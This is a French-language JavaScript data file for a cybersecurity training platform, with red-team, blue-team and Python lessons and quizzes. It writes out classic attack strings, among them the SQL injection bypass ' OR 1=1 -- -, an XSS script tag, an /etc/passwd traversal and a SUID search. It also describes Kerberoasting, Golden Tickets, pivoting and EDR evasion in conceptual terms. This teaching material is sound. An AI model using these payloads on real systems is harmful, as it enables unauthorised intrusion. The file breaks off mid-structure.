/* =========================================================================
   CYBERACADEMY PRO - Core Engine v10.0 (Masterclasses Massives & 6 QCMs)
   ========================================================================= */

const trackDB = {
    "red": [
        {
            id: 101, title: "Niveau 1 : Fondations Linux & Commandes Système",
            themes: [
                { 
                    id: "r_lvl1", title: "Masterclass : Maîtrise Approfondie du Terminal Linux", desc: "Guide complet (1-2 pages de lecture) : Navigation, permissions avancées, fichiers cachés et outils de recherche textuelle.", 
                    content: `
                        <h2>1. Introduction fondamentale au système Linux en cybersécurité</h2>
                        <p>Plus de 90 % des serveurs mondiaux, des routeurs des plus grands opérateurs, des supercalculateurs ainsi que les architectures Cloud (AWS, Azure, GCP) fonctionnent sous des distributions Linux. Pour un analyste en sécurité ou un testeur d'intrusion (Pentester), la maîtrise absolue du terminal Linux n'est pas une simple option : c'est la condition sine qua non pour survivre sur le terrain. Contrairement à l'architecture de bureau standard de Windows, la philosophie fondamentale de Linux repose sur un axiome immuable : <strong>tout est un fichier</strong>. Les disques durs physiques, les processus en cours d'exécution dans la mémoire, les interfaces réseau, les cartes graphiques et les périphériques de stockage sont tous représentés et manipulables sous forme de fichiers ou de flux de descripteurs au sein d'une arborescence unique unifiée par la racine (<code>/</code>).</p>
                        
                        <p>L'exploration et l'exploitation des systèmes Linux débutent toujours par la phase de repérage et de navigation. L'opérateur doit être capable de se déplacer instantanément à l'aveugle dans des environnements contraints (comme des conteneurs Docker ou des shells restreints). La commande <code>pwd</code> (Print Working Directory) permet à tout instant de connaître sa position exacte dans l'arborescence, tandis que <code>cd</code> (Change Directory) gère le déplacement à l'aide de chemins absolus (ex: <code>cd /var/www/html</code>) ou relatifs (ex: <code>cd ../config</code>).</p>

                        <h2>2. Les commandes indispensables d'investigation et d'analyse</h2>
                        <p>Pour lister, trier et inspecter les fichiers du système, un panel de commandes est quotidiennement utilisé par les professionnels de la sécurité :</p>
                        <table>
                            <tr><th>Commande</th><th>Description détaillée et usage en cyber</th><th>Exemple pratique</th></tr>
                            <tr><td><code>ls -la</code></td><td>Affiche l'intégralité des fichiers, y compris les fichiers masqués, avec leurs droits, propriétaires et tailles exactes.</td><td><code>ls -la /home/user/</code></td></tr>
                            <tr><td><code>cat / more / less</code></td><td>Permet de lire le contenu textuel brut d'un fichier de configuration ou de logs.</td><td><code>cat /etc/passwd</code></td></tr>
                            <tr><td><code>grep</code></td><td>Recherche un motif, une expression régulière ou une chaîne de caractères spécifique dans un flux ou un fichier.</td><td><code>cat access.log | grep "192.168"</code></td></tr>
                            <tr><td><code>find</code></td><td>Recherche des fichiers sur l'ensemble du disque selon des critères précis (permissions, date, taille, nom).</td><td><code>find / -perm -4000 2>/dev/null</code></td></tr>
                            <tr><td><code>chmod / chown</code></td><td>Modifient respectivement les permissions d'exécution/lecture/écriture et le propriétaire d'un fichier.</td><td><code>chmod 755 exploit.sh</code></td></tr>
                        </table>

                        <h2>3. Le secret des fichiers cachés et la logique des permissions (SUID/SGID)</h2>
                        <p>Les administrateurs système et les développeurs malveillants ou négligents masquent régulièrement des fichiers de configuration critiques (contenant des mots de passe en clair, des chaînes de connexion de bases de données ou des clés privées SSH) en plaçant simplement un point (<code>.</code>) au début de leur nom (ex: <code>.env</code>, <code>.git/</code>, <code>.ssh/id_rsa</code>). Par défaut, la commande classique <code>ls</code> ignore totalement ces fichiers. Pour les révéler au grand jour, l'opérateur doit impérativement utiliser l'indicateur d'affichage global : <code>ls -a</code> ou <code>ls -la</code>.</p>
                        
                        <p>De plus, la gestion de la sécurité sous Linux repose sur un modèle de permissions strict divisé en trois classes : <strong>Propriétaire (User)</strong>, <strong>Groupe (Group)</strong> et <strong>Autres (Others)</strong>. Chaque classe possède des droits de <strong>Lecture (r = 4)</strong>, d'<strong>Écriture (w = 2)</strong> et d'<strong>Exécution (x = 1)</strong>. Des attributs spéciaux comme le <strong>SUID (Set User ID)</strong> permettent à un utilisateur standard d'exécuter un binaire temporairement avec les privilèges élevés du propriétaire du fichier (souvent <code>root</code>), ce qui constitue un vecteur majeur d'élévation de privilèges si le binaire est mal conçu.</p>
                    `, 
                    simType: "terminal", 
                    simData: { instruction: "Exécutez la commande permettant de lister l'ensemble des fichiers, y compris les fichiers cachés.", expected: "ls -a", successOutput: "Fichiers détectés : config.php, .ssh_key, database.sql, .bash_history" }, 
                    quiz: [
                        { q: "1. Sous Linux, que signifie le fait qu'un nom de fichier commence par un point (.) ?", options: ["Il est corrompu et illisible", "Il est masqué / caché par le système de fichiers", "Il est en lecture seule absolue", "Il appartient obligatoirement à l'administrateur root"], ans: "1" },
                        { q: "2. Quelle commande Linux permet de rechercher un motif textuel spécifique à l'intérieur d'un fichier de log ?", options: ["find", "search", "grep", "locate"], ans: "2" },
                        { q: "3. Que gère précisément la commande chmod ?", options: ["Les permissions d'accès en lecture, écriture et exécution", "L'attribution dynamique des adresses IP", "Le hachage cryptographique du mot de passe root", "La vitesse du processeur du serveur"], ans: "0" },
                        { q: "4. Quel est le symbole textuel représentant le prompt du super-utilisateur (administrateur suprême root) ?", options: ["#", "$", "@", "£"], ans: "0" },
                        { q: "5. Comment obtenir la documentation détaillée d'une commande directement dans le terminal Linux ?", options: ["--help ou la commande man", "help-me svp", "info-doc online", "Rechercher sur Google"], ans: "0" },
                        { q: "6. Quel est l'impact du bit SUID sur un fichier exécutable sous Linux ?", options: ["Il permet à n'importe quel utilisateur d'exécuter le programme avec les privilèges du propriétaire du fichier", "Il supprime définitivement le fichier après exécution", "Il chiffre le code source en AES-256", "Il interdit l'accès réseau au binaire"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle commande liste l'intégralité des fichiers, y compris cachés ?", options: ["ls -a", "cat -all", "show hidden files"], ans: "0" }]
        },
        {
            id: 102, title: "Niveau 2 : OWASP Top 10 & Injections Web (SQLi, XSS)",
            themes: [
                { 
                    id: "r_lvl2", title: "Masterclass : Injections SQL et XSS Avancées", desc: "Guide complet (1-2 pages de lecture) : Contournement d'authentification et exécution de scripts côté client.", 
                    content: `
                        <h2>1. Injections SQL (SQLi) : Fondamentaux et Logique</h2>
                        <p>Une injection SQL (SQLi) représente l'une des failles web les plus destructrices de l'histoire du numérique. Elle survient lorsqu'une application web dynamique intègre des données ou des paramètres fournis par l'utilisateur (provenant d'un formulaire, d'une URL ou d'en-têtes HTTP) directement dans une requête construite à la volée vers une base de données relationnelle (SGBD comme MySQL, PostgreSQL, Oracle ou MSSQL), sans effectuer de validation, de typage ou d'échappement rigoureux. Le SGBD exécute alors la charge malveillante en croyant qu'il s'agit d'instructions légitimes écrites par le développeur.</p>
                        
                        <p>Prenons l'exemple d'une requête d'authentification vulnérable :<br>
                        <code>SELECT * FROM users WHERE username = 'input_user' AND password = 'input_password';</code></p>
                        
                        <p>Si un attaquant saisit dans le champ du mot de passe la charge utile classique <code>' OR 1=1 -- -</code>, la requête se transforme en :<br>
                        <code>SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 -- -';</code></p>
                        
                        <p>L'apostrophe ferme prématurément la chaîne de caractères du mot de passe, l'instruction <code>OR 1=1</code> force la condition à être mathématiquement toujours vraie, et les tirets <code>-- -</code> transforment tout le reste de la requête d'origine en commentaire inoffensif. Le serveur valide ainsi l'accès administrateur sans connaître le mot de passe réel.</p>

                        <h2>2. Cross-Site Scripting (XSS) : Le danger du code client</h2>
                        <p>Le Cross-Site Scripting (XSS) est une faille de sécurité web qui permet à un attaquant d'injecter des scripts côté client (généralement du JavaScript ou du HTML) dans des pages web consultées par d'autres utilisateurs. On distingue traditionnellement trois grandes familles de XSS :</p>
                        <ul>
                            <li><strong>XSS Reflected (Réfléchi) :</strong> Le script malveillant est passé via un paramètre HTTP (par exemple dans une URL de recherche) et renvoyé immédiatement par le serveur dans la page de réponse sans être stocké. La victime doit cliquer sur un lien piégé.</li>
                            <li><strong>XSS Stored (Stocké ou Persistant) :</strong> Le script est envoyé au serveur et enregistré de manière permanente dans la base de données (par exemple dans un espace de commentaires ou un profil utilisateur). Chaque utilisateur consultant la page charge et exécute le script à son insu.</li>
                            <li><strong>XSS DOM-Based :</strong> La vulnérabilité réside entièrement dans le code JavaScript exécuté côté client, qui manipule le DOM de manière non sécurisée.</li>
                        </ul>
                        <p>L'impact principal d'une attaque XSS réussie est le vol de session (récupération des cookies de connexion via <code>document.cookie</code>), l'usurpation d'identité de l'utilisateur, la redirection vers des sites malveillants ou la modification de l'interface graphique du site (Defacement).</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel payload classique permet un bypass d'authentification par injection SQL ?", options: ["' OR 1=1 -- -", "<script>alert(1)</script>", "../../etc/passwd", "SELECT * FROM secrets"], ans: "0" },
                        { q: "2. Quel est l'impact principal et le plus critique d'une faille XSS de type Stored ?", options: ["Vol des cookies de session et des jetons d'authentification des visiteurs du site", "Effacement complet du disque dur physique du serveur web distant", "Coupure totale de la fibre optique de l'entreprise", "Modification du mot de passe routeur Wi-Fi"], ans: "0" },
                        { q: "3. Qu'est-ce qu'une attaque Blind SQLi (Injection SQL aveugle) ?", options: ["Une injection où le serveur ne renvoie pas directement les résultats ou les erreurs SQL dans la page", "Une attaque réalisée par un pirate aveugle", "Un bug d'affichage des feuilles de style CSS"], ans: "0" },
                        { q: "4. Quelle est la contre-mesure absolue et recommandée pour stopper définitivement les injections SQL ?", options: ["L'utilisation exclusive de requêtes préparées (Prepared Statements / Parameterized Queries)", "Le chiffrement de toutes les pages en protocole HTTP simple", "Le masquage des boutons de connexion dans le code HTML", "L'augmentation de la mémoire RAM du serveur"], ans: "0" },
                        { q: "5. Que signifie l'acronyme WAF dans l'architecture de défense d'une application web ?", options: ["Web Application Firewall", "Wireless Access Framework", "Web Audit File", "Windows Application Folder"], ans: "0" },
                        { q: "6. Quel protocole réseau transporte par défaut le trafic web non chiffré sur Internet ?", options: ["HTTP (fonctionnant généralement sur le port TCP 80)", "FTP (utilisé pour le transfert de fichiers)", "SSH (dédié à l'administration sécurisée)", "SMTP (gérant les serveurs de messagerie)"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle contre-mesure stoppe net les injections SQL ?", options: ["Les requêtes préparées", "Un mot de passe long", "Le masquage d'URL"], ans: "0" }]
        },
        {
            id: 103, title: "Niveau 3 : Post-Exploitation & Élévation de Privilèges",
            themes: [
                { 
                    id: "r_lvl3", title: "Masterclass : SUID, Cron Jobs et Pivoting Avancé", desc: "Guide complet (1-2 pages de lecture) : Passage de l'utilisateur standard à root et rebond réseau.", 
                    content: `
                        <h2>1. Élévation de privilèges (PrivEsc) sous Linux</h2>
                        <p>Acquérir un premier accès sur un serveur cible (souvent par le biais d'une faille web ou d'un service obsolète) ne confère généralement qu'un accès restreint (par exemple en tant que l'utilisateur non privilégié <code>www-data</code> ou <code>nobody</code>). L'objectif critique de la phase de post-exploitation est de réaliser une <strong>élévation de privilèges</strong> pour atteindre le compte suprême <code>root</code>. Pour ce faire, les pentesters auditen t l'environnement à l'aide de scripts automatisés ou de commandes manuelles.</p>
                        
                        <p>Parmi les vecteurs les plus fréquents figurent la recherche de fichiers binaires possédant le bit <strong>SUID</strong> activé (permettant d'exécuter des programmes avec les droits de leur propriétaire, souvent root), l'analyse des tâches planifiées du système (fichiers <code>/etc/crontab</code> exécutant des scripts modifiables en écriture par un utilisateur standard), ou encore l'exploitation de noyaux Linux (Kernel Exploits) obsolètes.</p>

                        <h2>2. Pivoting et Redirection de port (Tunneling)</h2>
                        <p>Dans de nombreuses architectures d'entreprise modernes, le réseau est segmenté. La machine compromise possède souvent deux interfaces réseau : l'une publique connectée à Internet (exposant le serveur web vulnérable), et l'autre privée (interne), invisible depuis l'extérieur, connectée au domaine sensible ou aux bases de données internes.</p>
                        
                        <p>L'attaquant utilise alors la technique du <strong>Pivoting</strong> (ou rebond). La machine compromise sert de passerelle (pivot). L'opérateur y déploie des outils de tunneling (comme <code>Chisel</code>, <code>Socat</code> ou un tunnel SSH SOCKS proxy) pour encapsuler le trafic TCP/UDP et le faire transiter à travers la machine compromise, lui permettant ainsi de scanner, d'attaquer et de compromettre l'ensemble du réseau interne cloisonné.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Que permet de détecter précisément la commande find / -perm -4000 2>/dev/null ?", options: ["Les fichiers binaires possédant le bit SUID activé sur le système", "Les fichiers de configuration supprimés de la corbeille", "Les mots de passe stockés en clair dans le dossier personnel", "Les adresses IP connectées au port 80"], ans: "0" },
                        { q: "2. Qu'appelle-t-on le 'Pivoting' dans les opérations Red Team ?", options: ["Utiliser une machine compromise comme passerelle pour attaquer un réseau interne isolé et invisible depuis l'extérieur", "Tourner l'écran physique de l'ordinateur de l'administrateur", "Changer d'adresse IP source toutes les millisecondes", "Redémarrer le serveur à distance"], ans: "0" },
                        { q: "3. Quel outil de référence permet de créer un tunnel proxy SOCKS pour router du trafic à travers une machine compromise ?", options: ["Chisel", "Nmap", "Wireshark", "GIMP"], ans: "0" },
                        { q: "4. Quel risque majeur présente une tâche cron système mal configurée ?", options: ["Une élévation de privilèges si le script exécuté périodiquement est modifiable en écriture par un utilisateur standard", "Un crash total et immédiat de la carte mère", "Une panne d'électricité générale dans les bureaux", "Un effacement des certificats SSL"], ans: "0" },
                        { q: "5. Quel compte utilisateur possède par défaut tous les droits absolus d'administration sur un système Linux ?", options: ["root", "guest", "admin", "system"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un jeton d'accès (Access Token) sous système Windows ?", options: ["Un objet du noyau décrivant le contexte de sécurité et les privilèges d'un utilisateur connecté", "Un badge RFID physique d'accès aux locaux", "Une clé de chiffrement du disque dur BitLocker"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel bit permet à un exécutable d'être lancé avec les droits de son propriétaire ?", options: ["Le bit SUID", "Le bit Read-Only", "Le bit Exec-All"], ans: "0" }]
        },
        {
            id: 104, title: "Niveau 4 (Expert) : Attaques Active Directory & Evasion EDR",
            themes: [
                { 
                    id: "r_lvl4", title: "Masterclass : Kerberoasting, Golden Tickets et Contournement EDR", desc: "Guide complet (1-2 pages de lecture) : Compromission de domaines Windows et obfuscation avancée.", 
                    content: `
                        <h2>1. Attaques avancées sur l'Active Directory (AD)</h2>
                        <p>Dans la quasi-totalité des grandes entreprises, l'architecture réseau repose sur l'<strong>Active Directory (AD)</strong> de Microsoft, gérant les identités, les postes de travail et les serveurs d'un domaine. La compromission d'un domaine AD représente le graal d'une opération Red Team. Parmi les techniques offensives majeures figure le <strong>Kerberoasting</strong> : tout utilisateur du domaine peut demander un ticket de service Kerberos (TGS) pour n'importe quel service associé à un compte utilisateur classique. Ce ticket étant en partie chiffré avec le hachage du mot de passe du compte de service, l'attaquant peut l'extraire et le casser hors-ligne par force brute pour récupérer le mot de passe en clair.</p>
                        
                        <p>Une autre attaque dévastatrice est le <strong>Golden Ticket</strong> : si un attaquant récupère le hachage du compte de service spécial <code>krbtgt</code> du domaine, il peut forger lui-même un ticket d'authentification TGT (Ticket Granting Ticket) maître doté de privilèges administrateur totaux et d'une durée de validité arbitraire, lui accordant un contrôle absolu et persistant sur l'ensemble du domaine.</p>

                        <h2>2. Contournement d'EDR et techniques d'évasion</h2>
                        <p>Les solutions de sécurité modernes installées sur les postes (les <strong>EDR</strong> - Endpoint Detection and Response) surveillent en temps réel les appels système (syscalls) et les comportements suspects en mémoire. Pour opérer discrètement, les attaquants contournent ces barrières en utilisant des techniques d'obfuscation avancées : le <strong>Process Hollowing</strong> (qui consiste à lancer un processus légitime en mode suspendu, vider sa mémoire pour y loger un payload malveillant) ou encore le patch en mémoire de l'<strong>AMSI</strong> (Antimalware Scan Interface) pour neutraliser les analyses dynamiques de scripts.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce que le Kerberoasting en environnement Active Directory ?", options: ["Une technique d'extraction et de cassage hors-ligne de tickets de service Kerberos pour récupérer des mots de passe", "Une méthode de cuisson de café sur les serveurs racks", "Un protocole de chiffrement des connexions Wi-Fi d'entreprise"], ans: "0" },
                        { q: "2. Quel est l'objectif principal d'une attaque par Golden Ticket ?", options: ["Forger un ticket TGT maître pour obtenir un contrôle total et persistant sur l'ensemble du domaine Active Directory", "Gagner un voyage tous frais payés", "Obtenir un accès invité temporaire sans privilèges"], ans: "0" },
                        { q: "3. Que cible précisément l'AMSI (Antimalware Scan Interface) sous Windows ?", options: ["L'analyse en mémoire et en temps réel des scripts dynamiques (PowerShell, VBScript, .NET)", "La vitesse d'affichage de la carte graphique", "La résolution maximale de l'écran principal"], ans: "0" },
                        { q: "4. Qu'est-ce que la technique de 'Process Hollowing' ?", options: ["L'injection de code malveillant en vidant la mémoire d'un processus système légitime en cours d'exécution", "Le nettoyage de la corbeille du système", "L'optimisation des performances du processeur"], ans: "0" },
                        { q: "5. Quel protocole réseau est au cœur absolu de l'authentification dans un domaine Windows moderne ?", options: ["Kerberos", "SMTP", "DHCP", "FTP"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une attaque de type 'Pass-the-Hash' ?", options: ["Réutiliser directement un hachage de mot de passe capturé pour s'authentifier sans avoir à le casser en clair", "Changer son mot de passe en un hashtag sur les réseaux sociaux", "Effacer complètement le cache du navigateur web"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel protocole gère les tickets d'authentification dans un domaine Windows ?", options: ["Kerberos", "DNS", "SNMP"], ans: "0" }]
        }
    ],
    "blue": [
        {
            id: 201, title: "Niveau 1 : Analyse de Logs & Codes HTTP",
            themes: [
                { 
                    id: "b_lvl1", title: "Masterclass : Analyse Forensique Approfondie des Logs Web", desc: "Guide complet (1-2 pages de lecture) : Lecture des fichiers access.log et interprétation des codes de statut HTTP.", 
                    content: `
                        <h2>1. Le rôle crucial du SOC et de l'analyse des journaux</h2>
                        <p>Lorsqu'une entreprise subit une cyberattaque, le premier réflexe de l'équipe de défense (Blue Team) et des analystes du SOC (Security Operations Center) consiste à examiner minutieusement les journaux d'événements (logs). Chaque serveur web, pare-feu, routeur ou système d'authentification consigne les faits et gestes sous forme de lignes textuelles horodatées.</p>
                        
                        <p>L'anatomie d'une ligne de log Apache ou Nginx standard (Common Log Format) se lit de gauche à droite :<br>
                        <code>192.168.1.50 - - [06/Aug/2026:14:02:15 +0200] "GET /login.php?user=' OR 1=1 HTTP/1.1" 200 1024</code></p>
                        <ul>
                            <li><strong>192.168.1.50 :</strong> Adresse IP source de l'ordinateur qui initie la requête.</li>
                            <li><strong>[06/Aug/... :</strong> Date et heure exactes de la transaction.</li>
                            <li><strong>"GET /... :</strong> Méthode HTTP utilisée et ressource demandée.</li>
                            <li><strong>200 :</strong> Code de statut HTTP renvoyé par le serveur.</li>
                        </ul>

                        <h2>2. Interprétation stratégique des codes de statut HTTP</h2>
                        <p>Pour un analyste forensique, les codes de retour HTTP sont des indicateurs immédiats de la nature de l'activité observée :</p>
                        <table>
                            <tr><th>Code HTTP</th><th>Signification technique</th><th>Interprétation en cybersécurité</th></tr>
                            <tr><td><code>200 OK</code></td><td>Requête traitée et réussie avec succès.</td><td>Normal, mais nécessite une attention si la charge utile passe dans l'URL.</td></tr>
                            <tr><td><code>401 Unauthorized</code></td><td>Authentification obligatoire manquante.</td><td>Tentative d'accès à une zone protégée sans fournir d'identifiants.</td></tr>
                            <tr><td><code>403 Forbidden</code></td><td>Accès refusé par la configuration du serveur.</td><td>L'attaquant liste des dossiers interdits (directory traversal / fuzzing).</td></tr>
                            <tr><td><code>404 Not Found</code></td><td>Ressource introuvable sur le serveur.</td><td>Phase classique de reconnaissance (scan de répertoires par l'attaquant).</td></tr>
                            <tr><td><code>500 Internal Error</code></td><td>Erreur critique interne du serveur web.</td><td>Indice fort qu'une injection SQL ou une attaque a fait crasher le script backend.</td></tr>
                        </table>
                    `, 
                    simType: "logs", 
                    simData: { instruction: "Trouvez l'IP de l'attaquant dans les logs." }, 
                    quiz: [
                        { q: "1. Que signifie précisément le code de statut HTTP 403 dans un journal d'accès ?", options: ["Accès interdit / refusé par la configuration du serveur", "Succès complet de la transaction", "Redirection temporaire vers une autre page", "Erreur interne du code source PHP"], ans: "0" },
                        { q: "2. Quelle information essentielle se trouve placée en tout début de ligne dans un log d'accès web standard ?", options: ["L'adresse IP source de l'ordinateur distant à l'origine de la requête", "Le nom complet du processeur installé sur le serveur", "La capacité totale de stockage du disque dur", "Le mot de passe chiffré de l'administrateur"], ans: "0" },
                        { q: "3. Lorsqu'un attaquant envoie des centaines de requêtes sur des pages inexistantes (générant de multiples codes 404), à quelle phase de l'attaque cela correspond-il ?", options: ["Phase de reconnaissance, de scan et de découverte de répertoires cachés", "Phase de chiffrement des données de l'entreprise", "Phase de nettoyage des traces d'effacement", "Phase de post-exploitation active"], ans: "0" },
                        { q: "4. Quel est le rôle principal et quotidien d'une équipe Blue Team face aux flux de journaux ?", options: ["Surveiller, corréler, détecter et neutraliser les comportements malveillants", "Modifier les logs pour effacer les preuves d'intrusion", "Pirater les infrastructures des entreprises concurrentes", "Développer des sites web commerciaux e-commerce"], ans: "0" },
                        { q: "5. Que traduit l'apparition soudaine d'un code 500 Server Error suite à une manipulation suspecte dans un formulaire ?", options: ["Le script a planté, ce qui indique souvent une vulnérabilité logicielle ou une injection réussie", "Le serveur fonctionne de manière tout à fait normale", "L'utilisateur a fermé son navigateur web", "Le certificat SSL du site est valide"], ans: "0" },
                        { q: "6. Quel protocole réseau assure le transport chiffré des pages web consultées sur Internet ?", options: ["HTTPS (fonctionnant sur le port TCP 443)", "Telnet (non chiffré sur le port 23)", "HTTP simple en clair", "FTP de transfert"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel code HTTP indique une page introuvable ?", options: ["404", "200", "302"], ans: "0" }]
        },
        {
            id: 202, title: "Niveau 2 : Durcissement (Hardening) & Pare-feu",
            themes: [
                { 
                    id: "b_lvl2", title: "Masterclass : Sécurisation Système & Fail2Ban", desc: "Guide complet (1-2 pages de lecture) : Filtrage réseau et bannissement automatique.", 
                    content: `
                        <h2>1. Le durcissement (Hardening) de l'OS</h2>
                        <p>Le durcissement d'un système d'exploitation consiste à réduire drastiquement sa surface d'attaque en fermant l'ensemble des services superflus, en configurant un pare-feu strict (UFW / Iptables) et en interdisant formellement l'authentification par mot de passe pour le protocole SSH (privilégiant l'usage exclusif de paires de clés cryptographiques).</p>
                        <h2>2. Protection automatisée avec Fail2Ban</h2>
                        <p>Fail2Ban analyse en temps réel les journaux d'authentification pour identifier les schémas d'attaques par force brute (ex: multiples échecs SSH ou web) et applique des règles dynamiques de pare-feu pour bannir temporairement ou définitivement les adresses IP agressives.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel est l'objectif principal du Hardening (durcissement) d'un serveur informatique ?", options: ["Réduire la surface d'attaque en fermant les services et ports inutiles", "Augmenter la température physique du processeur", "Installer des suites de jeux vidéo en réseau", "Supprimer le système d'exploitation"], ans: "0" },
                        { q: "2. Quel outil standard analyse les fichiers de logs pour bannir automatiquement les IP agressives ?", options: ["Fail2Ban", "Adobe Photoshop", "Microsoft Notepad++", "VLC Media Player"], ans: "0" },
                        { q: "3. Quelle est la meilleure pratique absolue pour sécuriser l'accès distant à un serveur via SSH ?", options: ["Utiliser des clés cryptographiques SSH et interdire les mots de passe en clair", "Mettre 'admin' comme mot de passe par défaut", "Laisser le port 22 ouvert au monde entier sans pare-feu", "Noter le mot de passe sur un post-it"], ans: "0" },
                        { q: "4. Quelle est la fonction principale d'un pare-feu (Firewall) réseau ?", options: ["Filtrer le trafic réseau entrant et sortant selon des politiques de sécurité strictes", "Éteindre l'ordinateur en cas d'orage électrique", "Nettoyer régulièrement la poussière de l'écran", "Accélérer la connexion Wi-Fi"], ans: "0" },
                        { q: "5. Quel numéro de port TCP est utilisé par défaut pour le service d'administration sécurisée SSH ?", options: ["Port 22", "Port 80", "Port 21", "Port 443"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une règle DROP dans la configuration d'un pare-feu iptables ?", options: ["Ignorer et supprimer silencieusement le paquet réseau sans renvoyer d'avis à l'expéditeur", "Accepter et valider le paquet", "Rediriger le paquet vers un site tiers", "Imprimer le paquet sur papier"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel service bannit automatiquement les IP après plusieurs échecs de connexion ?", options: ["Fail2Ban", "Apache", "Cron"], ans: "0" }]
        },
        {
            id: 203, title: "Niveau 3 : Réponse sur Incident & SIEM",
            themes: [
                { 
                    id: "b_lvl3", title: "Masterclass : Corrélation d'Alertes et SIEM", desc: "Guide complet (1-2 pages de lecture) : Analyse centralisée des logs et gestion de crise.", 
                    content: `
                        <h2>1. Centralisation avec un SIEM</h2>
                        <p>Un SIEM (Security Information and Event Management) regroupe les logs de tout le système d'information pour corréler les alertes et détecter les attaques en temps réel.</p>
                        <h2>2. Confinement d'urgence</h2>
                        <p>Lors d'une intrusion avérée, l'équipe de réponse sur incident isole la machine infectée du réseau sans couper l'alimentation pour préserver la mémoire vive (RAM).</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Que signifie l'acronyme SIEM en cybersécurité opérationnelle ?", options: ["Security Information and Event Management", "System Internal Error Monitor", "Secure Internet Email Message", "Server Integrated Event Manager"], ans: "0" },
                        { q: "2. Pourquoi est-il strictement interdit d'éteindre brutalement une machine compromise lors d'un incident ?", options: ["Pour préserver l'intégrité de la mémoire vive (RAM) et des artefacts volatils cruciaux", "Pour économiser l'électricité de la salle serveurs", "Pour éviter de casser le clavier physique", "Pour ne pas abîmer le ventilateur"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un Indicateur de Compromission (IoC) ?", options: ["Un artéfact (hachage, IP, nom de fichier) prouvant qu'un système a été piraté", "Un voyant lumineux clignotant sur le boîtier", "Un certificat SSL valide et certifié", "Une facture d'achat de matériel"], ans: "0" },
                        { q: "4. Quelle est la toute première étape méthodologique du cycle de réponse sur incident ?", options: ["La préparation (Preparation)", "L'attaque de riposte offensive", "La vente des serveurs corrompus", "Le formatage complet des disques"], ans: "0" },
                        { q: "5. Que mesure le temps moyen de détection (MTTD) dans un SOC ?", options: ["Le temps moyen mis pour découvrir une intrusion sur le réseau", "Le temps nécessaire pour redémarrer un PC", "Le temps de téléchargement d'un fichier lourd", "Le temps de pause des analystes"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un rapport d'analyse post-mortem (Root Cause Analysis) ?", options: ["Un compte-rendu détaillé réalisé après la résolution de l'incident pour comprendre l'origine et éviter qu'il ne se reproduise", "Une autopsie médicale légale", "Un test de vitesse de disque dur"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel est l'objectif d'un SIEM ?", options: ["Centraliser et corréler les logs de sécurité en temps réel", "Envoyer des e-mails publicitaires", "Compresser les fichiers zip"], ans: "0" }]
        },
        {
            id: 204, title: "Niveau 4 (Expert) : Forensics Mémoire & Threat Intelligence",
            themes: [
                { 
                    id: "b_lvl4", title: "Masterclass : Analyse RAM Avancée (Volatility) & YARA", desc: "Guide complet (1-2 pages de lecture) : Extraction de processus cachés et recherche de signatures de malwares.", 
                    content: `
                        <h2>1. Forensics Mémoire avec Volatility</h2>
                        <p>L'analyse de dumps RAM permet de débusquer les rootkits et processus injectés invisibles sur le disque à l'aide de commandes comme <code>pslist</code>.</p>
                        <h2>2. Signatures YARA</h2>
                        <p>YARA permet de classer les malwares par reconnaissance de motifs textuels ou binaires spécifiques.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel framework est la référence absolue pour l'analyse forensique de dumps mémoire RAM ?", options: ["Volatility", "Wireshark", "Nmap", "GIMP"], ans: "0" },
                        { q: "2. À quoi servent principalement les règles YARA en cybersécurité ?", options: ["Identifier et classifier des malwares par la recherche de motifs spécifiques dans les fichiers", "Calculer des adresses IP dynamiques", "Optimiser les performances des bases de données SQL", "Dessiner des graphiques de réseau"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un rootkit au niveau système ?", options: ["Un logiciel malveillant conçu pour dissimuler sa présence et celle d'autres programmes au système d'exploitation", "Une application de jardinage sous Linux", "Un routeur Wi-Fi professionnel haut débit"], ans: "0" },
                        { q: "4. Que permet de détecter la commande pslist dans le framework Volatility ?", options: ["La liste des processus actifs présents dans la mémoire au moment du dump", "La liste des utilisateurs inscrits sur le site web", "Le contenu complet du disque dur physique", "La configuration de la carte réseau"], ans: "0" },
                        { q: "5. Qu'est-ce que la Threat Intelligence ?", options: ["L'analyse et la collecte de renseignements sur les menaces et les groupes de pirates informatiques", "Un test de QI obligatoire pour les administrateurs", "Un pare-feu intelligent dopé à l'IA"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un malware polymorphe ?", options: ["Un logiciel malveillant qui modifie son code à chaque infection pour échapper aux signatures statiques", "Un virus en plastique souple", "Un fichier image corrompu"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel outil utilise-t-on pour analyser un fichier de dump mémoire brut ?", options: ["Volatility", "GIMP", "VLC"], ans: "0" }]
        }
    ],
    "code": [
        {
            id: 301, title: "Niveau 1 : Automatisation de Base en Python",
            themes: [
                { 
                    id: "c_lvl1", title: "Masterclass : Requêtes HTTP & Parsing en Python", desc: "Guide complet (1-2 pages de lecture) : Utilisation du module requests et manipulation de fichiers.", 
                    content: `
                        <h2>1. Le module requests</h2>
                        <p>Python permet d'automatiser des actions web grâce à la bibliothèque <code>requests</code>. On peut envoyer des GET/POST et analyser les codes de statut instantanément.</p>
                    `, 
                    simType: "code", 
                    simData: { instruction: "Importez requests." }, 
                    quiz: [
                        { q: "1. Quel module Python gère les requêtes HTTP ?", options: ["requests", "os", "sys"], ans: "0" },
                        { q: "2. Que renvoie response.status_code pour un succès ?", options: ["200", "404", "500"], ans: "0" },
